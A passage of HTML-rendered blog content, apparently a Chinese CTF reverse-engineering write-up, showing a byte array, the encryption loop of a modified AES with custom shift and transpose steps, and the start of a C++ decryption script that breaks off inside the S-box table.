class="hljs-number">0xF3</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xF2</span>,<br>    <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x5E</span>,<br>    <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xC4</span>,<br>    <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x10</span>,<br>    <span class="hljs-number">0x07</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x71</span>,<br>    <span class="hljs-number">0x21</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x0F</span>,<br>    <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x6F</span>,<br>    <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x65</span>,<br>    <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x69</span>,<br>    <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x4A</span><br>&#125;;<br></code></pre></td></tr></table></figure></li></ol><p>正向加密流程如下(注意用的是 myshift，还有 myTranspose )</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++">myAddRoundKey(pArray, subkeys, <span class="hljs-number">0</span>);<br>printArray(pArray);<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">10</span>; i++)&#123;<br><br>    subBytes(pArray);<span class="hljs-comment">//字节代换</span><br><br>    myshift(pArray);<span class="hljs-comment">//行移位</span><br><br>    myTranspose(pArray);<br>    mixColumns(pArray);<span class="hljs-comment">//列混合</span><br>    myTranspose(pArray);<br><br>    myAddRoundKey(pArray, subkeys, i);<br>&#125;<br>subBytes(pArray);<br>myshift(pArray);<br>myAddRoundKey(pArray, subkeys, <span class="hljs-number">10</span>);<br></code></pre></td></tr></table></figure><h2 id="完整解密脚本"><a href="#完整解密脚本" class="headerlink" title="完整解密脚本"></a>完整解密脚本</h2><p>这份AES板子里的 convertToIntArray 函数有 bug 慎用！！！！</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cctype&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * S盒</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> S[<span class="hljs-number">16</span>][<span class="hljs-number">16</span>] = &#123; <span class="hljs-number">0x63</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x76</span>,<br>                               <span class="hljs-number">0xca</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xc0</span>,<br>                               <span class="hljs-number">0xb7</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>,<br>                               <span class="hljs-number">0x04</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x75</span>,<br>                               <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x84</span>,<br>                               <span class="hljs-number">0x53</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xcb</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xcf</span>,<br>                               <span class="hljs-number">0xd0</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0xa8</span>,<br>                               <span class="hljs-number">0x51</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd2</span>,<br>                               <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>,<br>                               <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0xdc</span>, <span 